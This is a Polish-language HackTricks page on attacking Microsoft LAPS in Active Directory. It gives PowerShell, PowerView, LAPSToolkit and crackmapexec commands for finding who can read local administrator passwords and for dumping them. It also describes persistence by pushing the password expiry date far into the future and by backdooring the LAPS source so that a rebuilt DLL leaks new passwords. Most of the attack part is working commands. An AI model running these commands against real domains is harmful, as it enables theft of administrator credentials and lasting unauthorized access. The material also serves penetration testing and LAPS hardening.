# LAPS

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć swoją **firmę reklamowaną w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Podstawowe informacje

Local Administrator Password Solution (LAPS) to narzędzie używane do zarządzania systemem, w którym do komputerów dołączonych do domeny stosowane są **unikalne, losowe i często zmieniane** hasła administratora. Te hasła są przechowywane bezpiecznie w Active Directory i są dostępne tylko dla użytkowników, którzy otrzymali uprawnienia poprzez listy kontroli dostępu (ACL). Bezpieczeństwo transmisji hasła z klienta do serwera jest zapewnione przez użycie **Kerberos w wersji 5** i **Advanced Encryption Standard (AES)**.

W obiektach komputerów domeny, wdrożenie LAPS skutkuje dodaniem dwóch nowych atrybutów: **`ms-mcs-AdmPwd`** i **`ms-mcs-AdmPwdExpirationTime`**. Te atrybuty przechowują odpowiednio **hasło administratora w postaci tekstu jawnego** i **czas jego wygaśnięcia**.

### Sprawdź, czy jest aktywowane
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### Dostęp do hasła LAPS

Możesz **pobrać surową politykę LAPS** z `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`, a następnie użyć **`Parse-PolFile`** z pakietu [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser), aby przekonwertować ten plik na czytelny dla człowieka format.

Ponadto, można użyć **natywnych poleceń PowerShell LAPS**, jeśli są zainstalowane na maszynie, do której mamy dostęp:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** może również być używany do sprawdzenia **kto może odczytać hasło i je odczytać**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) ułatwia wyliczanie LAPS za pomocą kilku funkcji. 
Jedną z nich jest analiza **`ExtendedRights`** dla **wszystkich komputerów z włączonym LAPS**. To pokaże **grupy**, które są specjalnie **upoważnione do odczytu haseł LAPS**, często są to użytkownicy w chronionych grupach. 
Konto, które dołączyło komputer do domeny, otrzymuje `All Extended Rights` na tym hoście, a to prawo daje temu **kontu** możliwość **odczytu haseł**. Wyliczenie może pokazać konto użytkownika, które może odczytać hasło LAPS na hoście. To może pomóc nam **skierować się do konkretnych użytkowników AD**, którzy mogą odczytywać hasła LAPS.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Wyciek hasła LAPS za pomocą narzędzia Crackmapexec**
Jeśli nie masz dostępu do powershella, możesz nadużyć tego uprawnienia zdalnie za pomocą protokołu LDAP, korzystając z narzędzia Crackmapexec.
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
To spowoduje wydrukowanie wszystkich haseł, które użytkownik może odczytać, umożliwiając uzyskanie lepszego punktu zaczepienia z innym użytkownikiem.

## **Trwałość LAPS**

### **Data wygaśnięcia**

Po uzyskaniu uprawnień administratora możliwe jest **uzyskanie haseł** i **uniemożliwienie** maszynie **aktualizacji** swojego **hasła** poprzez **ustawienie daty wygaśnięcia w przyszłości**.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
Hasło zostanie nadal zresetowane, jeśli **administrator** użyje polecenia **`Reset-AdmPwdPassword`**; lub jeśli w GPO LAPS jest włączona opcja **Nie zezwalaj na dłuższy czas wygaśnięcia hasła niż wymagany przez zasadę**.
{% endhint %}

### Backdoor

Oryginalny kod źródłowy LAPS można znaleźć [tutaj](https://github.com/GreyCorbel/admpwd), dlatego możliwe jest umieszczenie backdooru w kodzie (np. w metodzie `Get-AdmPwdPassword` w `Main/AdmPwd.PS/Main.cs`), który w jakiś sposób **wyciągnie nowe hasła lub je gdzieś zapisze**.

Następnie skompiluj nowy plik `AdmPwd.PS.dll` i przekaż go na maszynę do folderu `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (i zmień czas modyfikacji).

## References
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć **reklamę swojej firmy na HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
